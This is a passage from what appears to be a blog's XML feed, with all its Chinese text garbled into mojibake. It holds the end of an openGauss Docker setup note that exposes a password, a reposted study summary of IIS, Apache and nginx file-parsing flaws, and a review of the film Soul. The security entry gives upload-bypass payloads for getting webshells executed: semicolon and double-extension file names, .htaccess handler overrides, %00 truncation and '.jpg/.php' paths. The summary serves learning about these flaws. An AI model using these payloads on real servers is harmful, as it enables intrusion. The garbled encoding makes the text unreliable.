ä¸ºè¦ç”¨å¤–éƒ¨çš„æ•°æ®åº“ç®¡ç†è½¯ä»¶è¿æ¥æ•°æ®åº“ï¼Œæ‰€ä»¥ä»å®¹å™¨å†…éƒ¨çš„<code>5432</code>ç«¯å£æ˜ å°„åˆ°å¤–éƒ¨çš„<code>6666</code>ç«¯å£ï¼Œå¯†ç æ˜¯è®¾ç½®çš„ç¯å¢ƒå˜é‡<code>Aimerl0@123</code></p></li><li><p><code>enmotech/opengauss:latest</code>ï¼šæ‹‰å–çš„é•œåƒåå­—</p></li></ul><h2 id="æœªç”¨åˆ°çš„å‚æ•°è§£é‡Š"><a href="#æœªç”¨åˆ°çš„å‚æ•°è§£é‡Š" class="headerlink" title="æœªç”¨åˆ°çš„å‚æ•°è§£é‡Š"></a>æœªç”¨åˆ°çš„å‚æ•°è§£é‡Š</h2><ul><li><code>GS_NODENAME</code>ï¼šæŒ‡å®šæ•°æ®åº“èŠ‚ç‚¹åç§°ï¼Œé»˜è®¤ä¸º <code>guassdb</code></li><li><code>GS_USERNAME</code>ï¼šæŒ‡å®šæ•°æ®åº“è¿æ¥ç”¨æˆ·åï¼Œé»˜è®¤ä¸º<code>gaussdb</code></li><li><code>GS_PORT</code>ï¼šæŒ‡å®šæ•°æ®åº“ç«¯å£ï¼Œé»˜è®¤ä¸º<code>5432</code></li></ul><p>ä¹‹åæ‰§è¡Œ<code>docker start opengauss</code>å¯åŠ¨ openGauss é•œåƒ</p><p>å› ä¸ºæ˜¯ä¸Šè¯¾ç”¨çš„ï¼Œæ‰€ä»¥é€šè¿‡<code>docker update --restart=always opengauss</code>è®¾ç½® openGauss é•œåƒéšç€ docker çš„å¯åŠ¨è€Œå¯åŠ¨</p><p>è‡³æ­¤ openGauss å®‰è£…å®Œæˆ</p><h1 id="ä½¿ç”¨-openGauss"><a href="#ä½¿ç”¨-openGauss" class="headerlink" title="ä½¿ç”¨ openGauss"></a>ä½¿ç”¨ openGauss</h1><p>åœ¨ root ç”¨æˆ·çŠ¶æ€ä¸‹ä½¿ç”¨è¿æ¥å‘½ä»¤è¿æ¥æ•°æ®åº“ï¼š<code>docker exec -it opengauss bash</code></p><p><code>su - omm</code>åˆ‡æ¢è¶…çº§ç”¨æˆ·</p><p>æ‰§è¡Œå‘½ä»¤<code>gsql</code>è¿›å…¥æ•°æ®åº“</p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openGauss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœåŠ¡å™¨è§£ææ¼æ´å°ç»“</title>
      <link href="/posts/57799/"/>
      <url>/posts/57799/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>ä¹‹å‰æ‰“é¶æœºæœ‰åˆ©ç”¨åˆ°è¿‡ä¸€äº›è§£ææ¼æ´ï¼Œæœ€è¿‘è·Ÿç€æ¶…æ™®çš„è§†é¢‘è¿‡ä¸€éåŸºç¡€ï¼Œå‘ç°å¸ˆå‚…æ•´ç†å‡ºæ¥çš„æ–‡ç« å¾ˆä¸é”™ï¼Œè½¬è½½ä¸€ä¸‹</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218003459.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218004849.png"></p><h1 id="ä¸€ã€IIS5-x-6-xè§£ææ¼æ´"><a href="#ä¸€ã€IIS5-x-6-xè§£ææ¼æ´" class="headerlink" title="ä¸€ã€IIS5.x-6.xè§£ææ¼æ´"></a>ä¸€ã€IIS5.x-6.xè§£ææ¼æ´</h1><p>ä½¿ç”¨<code>iis5.x-6.x</code>ç‰ˆæœ¬çš„æœåŠ¡å™¨ï¼Œ<strong>å¤§å¤šä¸º windows server 2003</strong>ï¼Œç½‘ç«™æ¯”è¾ƒå¤è€ï¼Œå¼€å‘è¯­å¥ä¸€èˆ¬ä¸º <code>asp</code> ;è¯¥è§£ææ¼æ´ä¹Ÿåªèƒ½è§£æ <code>asp</code> æ–‡ä»¶ï¼Œè€Œä¸èƒ½è§£æ<code>aspx</code>æ–‡ä»¶ã€‚</p><h2 id="ç›®å½•è§£æ-6-0"><a href="#ç›®å½•è§£æ-6-0" class="headerlink" title="ç›®å½•è§£æ(6.0)"></a>ç›®å½•è§£æ(6.0)</h2><p>ç›®å½•ååŒ…å«<code>.asp .asa .cer</code>è¿™ç§å­—æ ·ï¼Œè¯¥ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶éƒ½è¢«å½“åšaspæ¥è¿›è¡Œè§£æ<br>ä¾‹å¦‚ï¼šåœ¨ç½‘ç«™ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹åå­—ä¸º.aspã€.asaçš„æ–‡ä»¶å¤¹ï¼Œå…¶ç›®å½•å†…çš„ä»»ä½•æ‰©å±•åçš„æ–‡ä»¶éƒ½è¢«IISå½“åšaspæ–‡ä»¶æ¥è§£æå¹¶æ‰§è¡Œã€‚<br>å½¢å¼ï¼š<a href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a></p><h2 id="æ–‡ä»¶è§£æ"><a href="#æ–‡ä»¶è§£æ" class="headerlink" title="æ–‡ä»¶è§£æ"></a>æ–‡ä»¶è§£æ</h2><p>å½¢å¼ï¼š<a href="http://www.xxx.com/xx.asp;.jpg%EF%BC%88%E6%96%87%E4%BB%B6%E5%90%8D%EF%BC%89">www.xxx.com/xx.asp;.jpgï¼ˆæ–‡ä»¶åï¼‰</a><br>åŸç†ï¼šæœåŠ¡å™¨é»˜è®¤ä¸è§£æ;å·åé¢çš„å†…å®¹ï¼Œå› æ­¤<code>xx.asp;.jpg</code>ä¾¿è¢«è§£ææˆaspæ–‡ä»¶äº†ã€‚</p><h2 id="è§£ææ–‡ä»¶ç±»å‹"><a href="#è§£ææ–‡ä»¶ç±»å‹" class="headerlink" title="è§£ææ–‡ä»¶ç±»å‹"></a>è§£ææ–‡ä»¶ç±»å‹</h2><p><code>IIS6.0</code> é»˜è®¤çš„å¯æ‰§è¡Œæ–‡ä»¶é™¤äº†<code>asp</code>è¿˜åŒ…å«è¿™ä¸‰ç§ :<code>.asa</code> <code>.cdx</code> <code>.cer</code></p><p>ä¾‹å¦‚ï¼š</p><ol><li><code>test.asa</code></li><li><code>test.cer</code></li><li><code>test.cdx</code></li></ol><h2 id="Iis7-5è§£ææ¼æ´-php-iniå¼€å¯cgi-fix-pathinfo"><a href="#Iis7-5è§£ææ¼æ´-php-iniå¼€å¯cgi-fix-pathinfo" class="headerlink" title="Iis7.5è§£ææ¼æ´(php.iniå¼€å¯cgi.fix_pathinfo)"></a>Iis7.5è§£ææ¼æ´(php.iniå¼€å¯cgi.fix_pathinfo)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.php --&gt; /xx.jpg         //ä¸Šä¼ .jpgä¸€å¥è¯ï¼Œè®¿é—®æ—¶åé¢åŠ ä¸Š/xx.php </span><br></pre></td></tr></table></figure><h1 id="äºŒã€apacheè§£ææ¼æ´"><a href="#äºŒã€apacheè§£ææ¼æ´" class="headerlink" title="äºŒã€apacheè§£ææ¼æ´"></a>äºŒã€apacheè§£ææ¼æ´</h1><h2 id="1-00æˆªæ–­ä¸Šä¼ æ¼æ´"><a href="#1-00æˆªæ–­ä¸Šä¼ æ¼æ´" class="headerlink" title="1. %00æˆªæ–­ä¸Šä¼ æ¼æ´"></a>1. %00æˆªæ–­ä¸Šä¼ æ¼æ´</h2><p><code>PHP 5.2</code> å­˜åœ¨æˆªæ–­ä¸Šä¼  (0x00) (%00)ï¼Œ<code>PHP 5.3</code> ä¹‹åå°±æ²¡æœ‰äº†è¯¥æ¼æ´</p><h2 id="2-å¤šåç¼€è§£æ"><a href="#2-å¤šåç¼€è§£æ" class="headerlink" title="2. å¤šåç¼€è§£æ"></a>2. å¤šåç¼€è§£æ</h2><p>ä¸€ä¸ªæ–‡ä»¶åä¸º test.x1.x2.x3 çš„æ–‡ä»¶ï¼ŒApacheä¼šä»x3çš„ä½ç½®å¾€x1çš„ä½ç½®å¼€å§‹å°è¯•è§£æï¼Œå¦‚æœx3ä¸å±äº Apacheè§£æçš„æ‰©å±•åï¼Œé‚£ä¹ˆApacheä¼šå°è¯•å»è§£æx2ï¼Œ è¿™æ ·ä¸€ç›´å¾€å‰å°è¯•ï¼Œç›´åˆ°é‡åˆ°ä¸€ä¸ªèƒ½è§£æçš„æ‰©å±•åä¸ºæ­¢ã€‚</p><p>ä¾‹å¦‚ï¼šWebåº”ç”¨é™åˆ¶äº†phpç­‰æ•æ„Ÿåç¼€ï¼Œæˆ‘ä»¬é€šè¿‡å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åä¸º <code>test.php.jpg</code> çš„æ–‡ä»¶ï¼Œè®¿é—®æ—¶ï¼ŒApacheä¼šå› ä¸ºæ— æ³•è§£æjpgï¼Œè€Œå‘å‰å¯»æ‰¾å¯ä»¥è§£æçš„åç¼€ï¼Œè¿™æ—¶ä¾¿æ‰¾åˆ°phpï¼Œé‚£ä¹ˆæŒ‰ç…§phpæ–‡ä»¶è¿›è¡Œæ­£å¸¸è§£æï¼Œä»è€Œä½¿æœ¨é©¬è¢«æ‰§è¡Œã€‚</p><h2 id="3-å…¶ä»–åç¼€è§£æ"><a href="#3-å…¶ä»–åç¼€è§£æ" class="headerlink" title="3. å…¶ä»–åç¼€è§£æ"></a>3. å…¶ä»–åç¼€è§£æ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.+\.ph(p[345]?|t|tml)$&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p><code>&quot;.+\.ph(p[345]?|t|tml)$&quot;</code> è¯¥æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„ä¸ä»…ä»…æœ‰phpï¼Œè¿˜æœ‰php3ã€php4ã€php5ã€phtå’Œphtmlï¼Œè¿™äº›éƒ½æ˜¯Apacheå’Œphpè®¤å¯çš„phpç¨‹åºçš„æ–‡ä»¶åç¼€ã€‚å¦‚æœç½‘ç«™ä»…å¯¹phpè¿›è¡Œäº†é˜²æŠ¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ”¹ä¸ºè¿™äº›ä¸å¤§å¸¸è§çš„åç¼€ï¼ŒåŒæ ·å®Œæˆè§£æã€‚</p><p>ä¾‹å¦‚ï¼š<code>test.php3 ã€ test.pt ã€ test.ptml</code></p><h2 id="4-htaccessè§£æ"><a href="#4-htaccessè§£æ" class="headerlink" title="4.  .htaccessè§£æ"></a>4.  .htaccessè§£æ</h2><blockquote><p>htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯ç”¨.htaccessï¼Œéœ€è¦ä¿®æ”¹httpd.confï¼Œå¯ç”¨AllowOverrideï¼Œå¹¶å¯ä»¥ç”¨AllowOverrideé™åˆ¶ç‰¹å®šå‘½ä»¤çš„ä½¿ç”¨ã€‚</span><br></pre></td></tr></table></figure><p>å¦‚æœåœ¨Apacheä¸­.htaccesså¯è¢«æ‰§è¡Œ.ä¸”å¯è¢«ä¸Šä¼ .é‚£å¯ä»¥å°è¯•åœ¨.htaccessä¸­å†™å…¥ï¼š<code>AddType application/x-httpd-php xxx</code> ï¼Œè¿™æ—¶ä¸Šä¼ <code>.xxx</code>åç¼€çš„æ–‡ä»¶ï¼Œå°±ä¼šå½“æˆphpè§£æã€‚</p><p>æˆ–è€…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;test.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>å½“Webåº”ç”¨åŒ¹é…åˆ°åä¸º test.jpg æ–‡ä»¶æ—¶ï¼ŒåŒæ ·ä¼šå½“æˆphpè§£æã€‚</p><h1 id="ä¸‰ã€nginxè§£ææ¼æ´"><a href="#ä¸‰ã€nginxè§£ææ¼æ´" class="headerlink" title="ä¸‰ã€nginxè§£ææ¼æ´"></a>ä¸‰ã€nginxè§£ææ¼æ´</h1><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>Nginx é»˜è®¤æ˜¯ä»¥ CGI çš„æ–¹å¼æ”¯æŒ PHP è§£æçš„ï¼Œæ™®éçš„åšæ³•æ˜¯åœ¨ Nginx é…ç½®æ–‡ä»¶ä¸­é€šè¿‡æ­£åˆ™åŒ¹é…è®¾ç½® <code>SCRIPT_FILENAME</code> ã€‚å½“è®¿é—®<a href="http://www.xx.com/phpinfo.jpg/1.php%E8%BF%99%E4%B8%AAURL%E6%97%B6%EF%BC%8C%60$fastcgi_script_name%60%E4%BC%9A%E8%A2%AB%E8%AE%BE%E7%BD%AE%E4%B8%BA">www.xx.com/phpinfo.jpg/1.phpè¿™ä¸ªURLæ—¶ï¼Œ`$fastcgi_script_name`ä¼šè¢«è®¾ç½®ä¸º</a> <code>â€œphpinfo.jpg/1.phpâ€</code>ï¼Œç„¶åæ„é€ æˆ<code> SCRIPT_FILENAME</code> ä¼ é€’ç»™ PHP CGIï¼Œä½†æ˜¯ PHP ä¸ºä»€ä¹ˆä¼šæ¥å—è¿™æ ·çš„å‚æ•°ï¼Œå¹¶å°† <code>phpinfo.jpg</code> ä½œä¸º <code>PHP æ–‡ä»¶</code>è§£æå‘¢?</p><p>è¿™å°±è¦è¯´åˆ° <code>fix_pathinfo</code> è¿™ä¸ªé€‰é¡¹äº†ã€‚ å¦‚æœå¼€å¯äº†è¿™ä¸ªé€‰é¡¹ï¼Œé‚£ä¹ˆå°±ä¼šè§¦å‘åœ¨ PHP ä¸­çš„å¦‚ä¸‹é€»è¾‘ï¼š<br>PHP ä¼šè®¤ä¸º <code>SCRIPT_FILENAME</code> æ˜¯<code> phpinfo.jpg</code>ï¼Œè€Œ <code>1.php</code> æ˜¯<code>PATH_INFO</code>ï¼Œæ‰€ä»¥å°±ä¼šå°† <code>phpinfo.jpg</code> ä½œä¸º<code>PHPæ–‡ä»¶</code>æ¥è§£æäº†</p><blockquote><p>Nginx çš„è§£ææ¼æ´å®è´¨ä¸Šæ˜¯å®é™…ä¸Šæ˜¯<code>PHP CGIè§£ææ¼æ´</code>ã€‚<br>è¿™ä¸æ˜¯ Nginx ç‰¹æœ‰çš„æ¼æ´ï¼Œåœ¨<code>IIS7.0</code>ã€<code>IIS7.5</code>ã€<code>Lighttpd</code>ç­‰ Web å®¹å™¨ä¸­ä¹Ÿç»å¸¸ä¼šå‡ºç°è¿™æ ·çš„è§£ææ¼æ´ã€‚</p></blockquote><h2 id="æ¼æ´å½¢å¼"><a href="#æ¼æ´å½¢å¼" class="headerlink" title="æ¼æ´å½¢å¼"></a>æ¼æ´å½¢å¼</h2><p><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php">www.xxxx.com/UploadFiles/image/1.jpg/1.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg%00.php">www.xxxx.com/UploadFiles/image/1.jpg%00.php</a><br>(<a href="http://www.xxxx.com/UploadFiles/image/1.jpg/%20/0.php">www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</a>)</p><p>å¦å¤–ä¸€ç§æ‰‹æ³•ï¼šä¸Šä¼ ä¸€ä¸ªåå­—ä¸º test.jpg ï¼Œç„¶åè®¿é—® test.jpg&#x2F;.php ,åœ¨è¿™ä¸ªç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€å¥è¯æœ¨é©¬ shell.php ã€‚</p><p>nginx è§£ææ¼æ´(php.iniå¼€å¯fix_pathinfo)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.php --&gt; xxx.jpg%00.php      //Nginx &lt;8.03 ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´</span><br></pre></td></tr></table></figure><h1 id="å››ã€IIS7-5è§£ææ¼æ´"><a href="#å››ã€IIS7-5è§£ææ¼æ´" class="headerlink" title="å››ã€IIS7.5è§£ææ¼æ´"></a>å››ã€IIS7.5è§£ææ¼æ´</h1><p>IIS7.5çš„æ¼æ´ä¸ nginx çš„ç±»ä¼¼ï¼Œéƒ½æ˜¯ç”±äº php é…ç½®æ–‡ä»¶ä¸­ï¼Œå¼€å¯äº†<code>cgi.fix_pathinfo</code>ï¼Œè€Œè¿™å¹¶ä¸æ˜¯ nginx æˆ–è€… iis7.5æœ¬èº«çš„æ¼æ´ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> hackæŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šå¿ƒçµå¥‡æ—…ã€‹ï¼šç–²æƒ«å¹´è½»äººçš„è‡ªæˆ‘æ•‘èµ</title>
      <link href="/posts/4402/"/>
      <url>/posts/4402/</url>
      
        <content type="html"><![CDATA[<blockquote><blockquote><p>å®Œæˆäº2021.01.27æ¸…æ™¨</p></blockquote><p>2021.01.25</p><p>å†™åœ¨å‰é¢</p><p>å¯’å‡å›æ¥å‰å‡ å¤©å¸¸æœ‰èšä¼šï¼Œå¸¸è§„çš„åƒé¥­çœ‹ç”µå½±èŠå¤©ï¼Œæ­¤ç¯‡åšå®¢å†™åœ¨äºŒåˆ·åï¼Œè¿™éƒ¨ç”µå½±çœŸçš„å¥½å¥½çœ‹å¥½å¥½çœ‹ï¼Œæ˜¯ä¸ºæ•°ä¸å¤šèƒ½è®©æˆ‘åœ¨ç”µå½±é™¢å®Œå®Œå…¨å…¨æ”¾æ¾ä¸€æ•´åœºçš„ç”µå½±ï¼Œç›¸æ¯”è¾ƒä¹‹å‰é‚£éƒ¨å¯»æ¢¦ç¯æ¸¸è®°ï¼Œå¦‚æœè¯´å¯»æ¢¦ç¯æ¸¸è®°è®²çš„æ˜¯æ­»ï¼Œé‚£ä¹ˆå¿ƒçµå¥‡æ—…è®²çš„å°±æ˜¯ç”Ÿ</p></blockquote><h2 id="å¤§æ¦‚æƒ…èŠ‚"><a href="#å¤§æ¦‚æƒ…èŠ‚" class="headerlink" title="å¤§æ¦‚æƒ…èŠ‚"></a>å¤§æ¦‚æƒ…èŠ‚</h2><p>ä¸»è§’ Joe æ˜¯ä¸€ä¸ªå¹³å‡¡ä¸”æ™®é€šçš„äººï¼Œå°æ—¶å€™å¶ç„¶é—´å–œæ¬¢ä¸Šäº†çˆµå£«ä¹å¹¶æ²‰è¿·å…¶ä¸­ï¼Œé•¿å¤§åæ²¡æœ‰å®ç°æ¢¦æƒ³ï¼Œåšç€æ™®é€šçš„å…¼èŒéŸ³ä¹è€å¸ˆå·¥ä½œï¼Œè·Ÿç”Ÿæ´»ä¸­ç»å¤§éƒ¨åˆ†äººä¸€æ ·å§ã€‚</p><p>æœ‰ä¸€å¤©çªç„¶å­¦æ ¡æ‰“ç®—å½•ç”¨ä»–ä¸ºæœ‰ç¼–åˆ¶çš„å‘˜å·¥ï¼ŒåŒæ—¶å½“å¤©è¿˜è·å¾—äº†è·Ÿå–œæ¬¢çš„æ¼”å¥å®¶åŒå°çš„æœºä¼šï¼Œå®¶äººä¸æ”¯æŒææ¼”å‡ºï¼Œä½†æ˜¯ Joe ä¸€ç›´æ¢¦å¯ä»¥æ±‚çš„å°±æ˜¯ä¸Šå°æ¼”å‡ºï¼Œä¸å¹¸çš„æ˜¯ï¼Œå› ä¸ºå¤ªå¼€å¿ƒäº†ï¼Œèµ°è·¯ä¸Šä¸å°å¿ƒæ‰äº•é‡Œäº†ï¼Œæ­¤æ—¶çµé­‚è„±ç¦»èº«ä½“ï¼Œæ¥åˆ°äº†ç”Ÿä¹‹å½¼å²¸ï¼ŒJoe ä¸èƒ½æ¥å—è‡ªå·±è¦æ­»å»ï¼Œä¸è‚¯èµ°å‘æ¥ç”Ÿï¼Œäºæ˜¯æ‰è¿›äº†å¿ƒçµå­¦é™¢ã€‚</p><p>å¿ƒçµå­¦é™¢ä¹Ÿå«ç”Ÿä¹‹æ¥å¤„ï¼Œè¿˜æ²¡æœ‰æŠ•èƒçš„çµé­‚åœ¨è¿™é‡Œè·å¾—ä¸ç”Ÿä¿±æ¥çš„æ€§æ ¼ï¼Œæœ€åéœ€è¦é€šè¿‡å¿ƒçµå¯¼å¸ˆçš„å¼•å¯¼ï¼Œç‚¹ç‡ƒâ€œç«èŠ±â€æ‹¿åˆ°é€šå¾€åœ°çƒçš„é€šè¡Œè¯ã€‚</p><p>Joe æ„å¤–æˆäº†ä¸€åå¿ƒçµå¯¼å¸ˆï¼Œè´Ÿè´£ç»™22å·çµé­‚æ‰¾åˆ°ç«èŠ±ï¼Œ22å·çµé­‚éå¸¸éš¾æï¼Œè¢«è®¸è®¸å¤šå¤šçš„åäººå¼•å¯¼è¿‡ï¼Œè­¬å¦‚ç‰¹è•¾èä¿®å¥³ã€å“¥ç™½å°¼ã€æ—è‚¯ã€è£æ ¼â€¦â€¦ä»–ä»¬éƒ½æ²¡èƒ½è®©22å·æ‰¾åˆ°ç«èŠ±ï¼Œä¸€æ¬¡æ¬¡çš„å¤±è´¥å’Œè¢«å¯¼å¸ˆæ‰“å‡»ï¼Œè®©22å·åˆä¸§åˆå†·ï¼Œå¤±å»äº†å¯¹ç”Ÿæ´»çš„å‘å¾€ï¼Œå®ƒæŠ±ç€æ¶ˆæçš„å¿µå¤´ï¼Œè‡ªæš´è‡ªå¼ƒï¼Œæ‰“ç®—æ°¸è¿œè€—ä¸‹å»ã€‚</p><p><strong>åœ¨22å·çœ¼é‡Œï¼Œç”Ÿæ´»æ˜¯ä¸€ä»¶æ¯«æ— æ„ä¹‰çš„äº‹æƒ…ï¼Œç³Ÿç³•ã€ç©ºè™šã€æ— èŠï¼Œå®ƒä¸æƒ³å»åœ°çƒï¼Œä¹Ÿå®³æ€•ä½“éªŒäººç”Ÿã€‚</strong></p><p>Joe ä¸æ„¿é”™è¿‡æ™šä¸Šæ¼”å‡ºçš„æœºä¼šï¼Œæ‰“ç®—è®©22å·æ‹¿åˆ°é€šè¡Œè¯ç„¶åç»™è‡ªå·±é‡è¿”åœ°çƒå‚åŠ æ¼”å‡ºï¼Œé˜´å·®é˜³é”™22å·è¯¯å…¥äº† Joe çš„èº«ä½“ï¼Œè€Œ Joe çš„çµé­‚é˜´å·®é˜³é”™ä¸‹è¿›å…¥äº†çŒ«çš„èº¯ä½“ï¼Œ22å·è¢«è¿«åœ¨åœ°çƒç”Ÿæ´»äº†å‡ ä¸ªå°æ—¶ï¼Œä½†æ˜¯å°±åœ¨è¿™å‡ ä¸ªå°æ—¶å†…ï¼Œå¥¹ä½“éªŒåˆ°äº†ç”Ÿæ´»ï¼Œå–œæ¬¢æŠ«è¨ï¼Œå–œæ¬¢è·‘æ­¥ï¼Œå–œæ¬¢çœ‹å¤©ç©ºâ€¦â€¦ä¹Ÿç”±æ­¤çˆ±ä¸Šäº†ç”Ÿæ´»ï¼Œæœ‰äº†æƒ³è¦ç”Ÿæ´»ä¸‹å»çš„å‹‡æ°”å’Œä¿¡å¿ƒï¼Œä¹Ÿç‚¹äº®äº†è‡ªå·±çš„â€œç«èŠ±â€ã€‚</p><p>ä½†æ˜¯ Joe åœ¨å…³é”®æ—¶å€™å› ä¸ºæ€¥ç€å’Œ22å·æ¢å›èº«ä½“ï¼Œä¼¤å®³äº†22å·ï¼Œ22å·å°†åœ°çƒå‹‹ç« è®©ç»™äº† Joeï¼Œè‡ªå·±å´å¤±è½åœ°èº²äº†èµ·æ¥ï¼Œè¢«å¦å®šçš„å£°éŸ³ç¬¼ç½©åœ¨é˜´å½±ä¹‹ä¸­ï¼Œæˆä¸ºäº†è¿·å¤±çš„çµé­‚ã€‚</p><p>å›åˆ°è‡ªå·±èº«ä½“çš„ Joe èµ¶ä¸Šäº†æœ€é‡è¦çš„æ¼”å‡ºï¼Œä¹Ÿæ„Ÿæ‚Ÿåˆ°äº†ç”Ÿå‘½çš„çœŸè°›ï¼Œè¿›å…¥å¿ƒæµçŠ¶æ€å›åˆ°äº†å¿ƒçµå­¦é™¢ï¼Œæ•‘å›äº†22å·ï¼Œè‡ªå·±ä¹Ÿåœ¨æ°ç‘ä»¬çš„å¸®åŠ©ä¸‹é‡è·æ–°ç”Ÿã€‚</p><blockquote><p>äºŒåˆ·æœ‰ä¸€éƒ¨åˆ†åŸå› æ˜¯å› ä¸ºä¸€åˆ·è¿‡åçœ‹åˆ°ç½‘ä¸Šæœ‰è¯´ç»“å°¾æœ‰å½©è›‹ï¼Œç»“æœï¼</p><p>äºŒåˆ·çš„æ—¶å€™ç»“å°¾ç­‰äº†ååˆ†é’Ÿï¼Œæœ€åé»›ç‘çªç„¶è·³å‡ºæ¥ç»™æˆ‘æ¥äº†ä¸€å¥ï¼šç”µå½±çœ‹å®Œäº†æ€ä¹ˆè¿˜ä¸èµ°ï¼</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/03087bf40ad162d9f9c820aadeb17deb8b13cddc.jpg"></p></blockquote><h2 id="æ„Ÿæ‚Ÿ"><a href="#æ„Ÿæ‚Ÿ" class="headerlink" title="æ„Ÿæ‚Ÿ"></a>æ„Ÿæ‚Ÿ</h2><p>ç”µå½±é‡Œï¼Œæœ‰å‡ ä¸ªæƒ…èŠ‚å¾ˆæ‰“åŠ¨æˆ‘ã€‚</p><p>ç¬¬ä¸€ä¸ªæ˜¯22å·çµé­‚åœ¨çœ‹å¤©ç©ºçš„æ—¶å€™ï¼Œä¸€ç‰‡æ ‘å¶æ…¢æ…¢çš„é£˜åˆ°äº†æ‰‹é‡Œã€‚</p><p>è¿™æ˜¯ä¸€æ®µé•¿é•œå¤´ï¼Œéå¸¸å®‰é™ï¼Œè®©äººéå¸¸èˆ’æœï¼Œä»¿ä½›è‡ªå·±ä¹Ÿåœ¨æ„Ÿæ‚Ÿç”Ÿå‘½çš„çœŸè°›ã€‚</p><p>ä»å°åˆ°å¤§ï¼Œè€æ˜¯è€ƒè¯•ï¼Œåšé¢˜ï¼Œå¥½åƒä¸€åˆ‡çš„ä¸œè¥¿éƒ½æœ‰ç­”æ¡ˆï¼Œéƒ½æœ‰æ˜¯éå¯¹é”™ï¼Œä½†æ˜¯äººç”Ÿå®ƒå°±æ˜¯ä¸€ä¸ªå¼€æ”¾å¼å‘½é¢˜ï¼Œä¸é™æ ¼å¼ï¼Œä¸é™å­—æ•°ï¼Œä¸é™é—®é¢˜ï¼Œç”šè‡³è¿è¯„åˆ¤æ ‡å‡†ä¹Ÿæ²¡æœ‰ï¼Œå°±åƒç”µå½±é‡Œçš„â€œç«èŠ±â€ã€‚<strong>ç«èŠ±å¹¶ä¸æ˜¯ä¸€ä¸ªçµé­‚çš„ç›®çš„ï¼Œè€Œæ˜¯å½“ä½ æƒ³è¦ç”Ÿæ´»çš„é‚£ä¸€åˆ»ï¼Œå®ƒä¸æ˜¯ä»€ä¹ˆäººç”Ÿç›®æ ‡ï¼Œäººç”Ÿæ–¹å‘ï¼Œä¼Ÿå¤§è¿½æ±‚ï¼Œå®ƒæœ‰å¯èƒ½ä»…ä»…æ˜¯ä¸€ç‰‡è½å¶</strong>ã€‚ä»¥å‰è€æ˜¯ä¼šæƒ³äººç”Ÿçš„æ„ä¹‰æ˜¯ä»€ä¹ˆï¼Œå…¶å®å“ªæœ‰é‚£ä¹ˆå¤šäººç”Ÿçš„æ„ä¹‰ï¼Œçƒ­çˆ±ç”Ÿæ´»å¥½å¥½è¿‡å¥½æ¯ä¸€å¤©ï¼Œå¥½å¥½çæƒœèº«è¾¹çš„äººï¼Œå°±æ˜¯æœ€æœ‰æ„ä¹‰çš„äº‹æƒ…äº†ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/v2-d3c77d5901fda8849c0963fe2cf99d0a_1440w.jpg"></p><p>ç¬¬äºŒä¸ªæ˜¯é‡è¿”äººé—´åçš„ Joe 